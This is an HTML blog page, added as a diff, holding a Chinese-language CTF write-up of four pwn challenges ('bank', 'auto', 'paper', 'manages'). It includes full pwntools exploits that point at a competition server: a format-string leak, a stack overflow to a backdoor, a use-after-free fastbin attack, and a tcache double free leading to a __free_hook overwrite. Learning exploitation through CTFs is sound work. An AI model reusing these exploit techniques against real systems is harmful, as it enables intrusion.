@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CTF to learn,not learn to CTF">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ABf1ag&#39;s blog">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="ABf1ag&#39;s blog">
+<meta property="og:description" content="CTF to learn,not learn to CTF">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="ABf1ag">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ABf1ag's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ABf1ag's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-fw fa-calendar"></i>Schedule</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/10/cstc%E9%83%A8%E5%88%86pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ABf1ag">
+      <meta itemprop="description" content="CTF to learn,not learn to CTF">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ABf1ag's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/06/10/cstc%E9%83%A8%E5%88%86pwn/" class="post-title-link" itemprop="url">cstc部分pwn</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-06-10 21:47:41 / Modified: 21:51:08" itemprop="dateCreated datePublished" datetime="2021-06-10T21:47:41+08:00">2021-06-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="1-bank"><a href="#1-bank" class="headerlink" title="1.bank"></a>1.bank</h2><p>直接拖入ida分析，password是由fgets函数读取的，因此当生成的第一个随机数为0xa时，密码就会被截断，即为0xa。<br><img src="https://img-blog.csdnimg.cn/20210505211326879.png" alt="在这里插入图片描述"><br>可以发现flag被读入栈中，并且有格式化字符串漏洞，经调试后当输入%8$s时即可读出flag。<br><img src="https://img-blog.csdnimg.cn/2021050521154855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编写exp时，因需要爆破，所以当读到flag就用sleep()函数来使程序暂停，exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./bank&#x27;)</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10000)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">def exp():</span><br><span class="line">    io.sendlineafter(&#x27;account:\n&#x27;,&#x27;a&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.recvuntil(&#x27;password:\n&#x27;)</span><br><span class="line">    payload = &#x27;&#x27;</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    res = io.recv(2)</span><br><span class="line">    io.sendlineafter(&#x27;balance?\n&#x27;,&#x27;yes&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendlineafter(&#x27;code: \n&#x27;,&#x27;%8$s&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Your input is: &#x27;)</span><br><span class="line">    res=io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">    if res==&#x27;&#x27;:</span><br><span class="line">        exit(0)</span><br><span class="line">    else:</span><br><span class="line">        sleep(10)</span><br><span class="line">i=0</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">#exp()</span><br><span class="line">while(i!=100):</span><br><span class="line">    try:</span><br><span class="line">        io = remote(&#x27;81.70.195.166&#x27;,10000)</span><br><span class="line">        exp()</span><br><span class="line">        print(res)</span><br><span class="line">        i+=1</span><br><span class="line">    except:</span><br><span class="line">        i+=1</span><br><span class="line">        print(res)</span><br><span class="line">        io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-auto"><a href="#2-auto" class="headerlink" title="2.auto"></a>2.auto</h2><p>托入ida分析后发现一大堆重复函数，导致不能反汇编，因此我们需要通过patch来跳过这些重复函数。patch方法如下所示。<br><img src="https://img-blog.csdnimg.cn/20210505212613722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>patch结束后再反汇编得到伪代码如下所示。<br><img src="https://img-blog.csdnimg.cn/20210505212712638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>此时代码逻辑就变得很简单，<code>complex_functin</code>函数为加密函数，编写解密脚本使其进入<code>aas</code>中的<code>login</code>，脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a2=0</span><br><span class="line">a=&quot;UCIJEURI&quot;</span><br><span class="line">key=[]</span><br><span class="line">for a2 in range(8):</span><br><span class="line">    for a1 in range(65,91):</span><br><span class="line">        if ord(a[a2])==(5 * a2 + a1 - 65) % 26 + 65:</span><br><span class="line">            key.append(chr(a1))</span><br><span class="line">            print(a2)</span><br><span class="line">            break</span><br><span class="line">print(&#x27;&#x27;.join(key))</span><br></pre></td></tr></table></figure>
+
+<p><code>login</code>函数如下所示，可以发现scanf函数没有限制长度，因此可以输入任意长度造成栈溢出，将返回地址改写到后门函数，拿到shell<br><img src="https://img-blog.csdnimg.cn/20210505213038612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10001)</span><br><span class="line">#io = process(&#x27;./auto&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">io.recvuntil(&#x27;password: \n&#x27;)</span><br><span class="line">back = 0x8048665</span><br><span class="line">payload = &#x27;UXYUKVNZ&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&#x27;again: \n&#x27;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;*(0x48+4)+p32(back)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="3-paper"><a href="#3-paper" class="headerlink" title="3.paper"></a>3.paper</h2><p>给了libc，先确定libc版本，可以直接<code>./libc.so.6</code>查看版本，也可以通过<a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts:6a0,gets:d90">在线网站</a>利用中两个函数的偏移确定版本，发现是libc-2.23。</p>
+<p>分析各个函数作用，发现free后指针未置0存在uaf漏洞<br><img src="https://img-blog.csdnimg.cn/20210505213839410.png" alt="在这里插入图片描述"><br>这两个函数一个泄露了栈地址，另一个是修改栈地址<br><img src="https://img-blog.csdnimg.cn/2021050521393840.png" alt="在这里插入图片描述"></p>
+<p>然后发现有后门函数，且v9在被泄露地址的变量的下方<br><img src="https://img-blog.csdnimg.cn/20210505214102660.png" alt="在这里插入图片描述"></p>
+<p>因此我们可以改变v9的值来拿shell，现在我们利用uaf漏洞，先申请一个chunk，再释放。又因为free后指针没有置0，我们可以利用第三个函数来改写fd指针。<br><img src="https://img-blog.csdnimg.cn/20210505214338171.png" alt="在这里插入图片描述"></p>
+<p>改写fd指针为目标地址后再连续申请两次chunk即可得到我们的目标chunk。现在还缺一个目标地址，利用第4个函数泄露出栈地址，再用第5个函数改写栈地址为0x21（fastbin会检查size域），然后申请两次chunk即可改写v9的值。</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./paper&#x27;)</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10003)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">def add():</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;1 &#x27;)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Index:\n&#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def edit(a1,a2):</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Index:\n&#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;word count:\n&#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def move(a1):</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;5 &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Which disk?\n&#x27;,str(a1))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add()#0</span><br><span class="line">    add()#1</span><br><span class="line">    dele(0)</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.recvuntil(&#x27;at: &#x27;)</span><br><span class="line">    stack = int(io.recv(14),16)</span><br><span class="line">    print(hex(stack))</span><br><span class="line">    move(33 )</span><br><span class="line">    edit(0,stack-8)</span><br><span class="line">    add()#2</span><br><span class="line">    add()#3</span><br><span class="line">    edit(3,3435973836)</span><br><span class="line">    io.sendafter(&#x27;choice &gt; &#x27;,&#x27;6 &#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+<h2 id="5-manages"><a href="#5-manages" class="headerlink" title="5.manages"></a>5.manages</h2><p>libc版本为2.27<br>思路是先泄露heapbase以控制tcache，再泄露libc_base，然后打__free_hook。</p>
+<p>free后指针未置0。<br><img src="https://img-blog.csdnimg.cn/20210505215230337.png" alt="在这里插入图片描述"><br>这个<code>change_summary</code>函数的作用是free掉*(bookcase[v1]),并申请一个chunk进行替换。<br><img src="https://img-blog.csdnimg.cn/20210505215336785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过此操作可以泄露处heapbase</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(8,&#x27;0&#x27;,0x89,&#x27;0&#x27;)#0</span><br><span class="line">add(8,&#x27;1&#x27;,0x89,&#x27;1&#x27;)#1</span><br><span class="line">edit(0,0x18,&#x27;&#x27;)</span><br><span class="line">edit(1,0x18,&#x27;&#x27;)</span><br><span class="line">edit(1,0x90,&#x27;&#x27;)</span><br><span class="line">show(1)</span><br></pre></td></tr></table></figure>
+<p>泄露出heapbase后利用doublefree以申请到tcache来控制tcache，然后将0x250对应的counts改为&gt;7的数，再free掉tcache以获得libcbase的基地址。</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./managebooks&#x27;)</span><br><span class="line">io = remote(&#x27;81.70.195.166&#x27;,10004)</span><br><span class="line">libc = ELF(&#x27;./libc1.so.6&#x27;)</span><br><span class="line">def add(a1,a2,a3,a4):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;1 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;size: &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Enter book name: &#x27;,a2)</span><br><span class="line">    io.sendafter(&#x27;Enter book summary size: &#x27;,str(a3)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Enter book summary: &#x27;,a4)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;2 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def edit(a1,a2,a3):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Enter book summary size: &#x27;,str(a2)+&#x27; &#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Enter book summary: &#x27;,a3)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;4 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,str(a1)+&#x27; &#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(8,&#x27;0&#x27;,0x89,&#x27;0&#x27;)#0</span><br><span class="line">    add(8,&#x27;1&#x27;,0x89,&#x27;1&#x27;)#1</span><br><span class="line">    edit(0,0x18,&#x27;&#x27;)</span><br><span class="line">    edit(1,0x18,&#x27;&#x27;)</span><br><span class="line">    edit(1,0x90,&#x27;&#x27;)</span><br><span class="line">    show(1)</span><br><span class="line">    heapbase = (u64(io.recv(4).ljust(8,&#x27;\x00&#x27;))&gt;&gt;12)&lt;&lt;12</span><br><span class="line">    print(hex(heapbase))</span><br><span class="line">    dele(0)</span><br><span class="line">    dele(0)</span><br><span class="line">    payload = p64(heapbase+0x98)</span><br><span class="line">    edit(1,0x18,payload)</span><br><span class="line">    add(7,&#x27;2&#x27;,0x89,&#x27;2&#x27;)#2</span><br><span class="line">    add(0x10,p64(heapbase+0x10),0x89,p64(heapbase+0x10))#3tcache</span><br><span class="line">    add(8,&#x27;4&#x27;,0xa7,&#x27;\x00&#x27;*0x20+&#x27;\xff&#x27;*0x10+&#x27;\x00&#x27;*0x10+&#x27;\x00&#x27;*0x10)#4</span><br><span class="line">    edit(4,0x18,&#x27;a&#x27;)</span><br><span class="line">    edit(4,0x40,&#x27;&#x27;)</span><br><span class="line">    show(4)</span><br><span class="line">    malloc_hook = (u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0xa)+0xa0-96-16</span><br><span class="line">    libcbase = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    free_hook = libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    edit(4,0x40,&#x27;\x00&#x27;*0x28+p64(free_hook-0x8))</span><br><span class="line">    #pause()</span><br><span class="line">    add(7,&#x27;5&#x27;,0x27,&#x27;/bin/sh\x00&#x27;+p64(system))</span><br><span class="line">    pause()</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,&#x27;5 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Enter book summary size: &#x27;,&#x27;16 &#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ABf1ag</p>
+  <div class="site-description" itemprop="description">CTF to learn,not learn to CTF</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ABf1ag</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
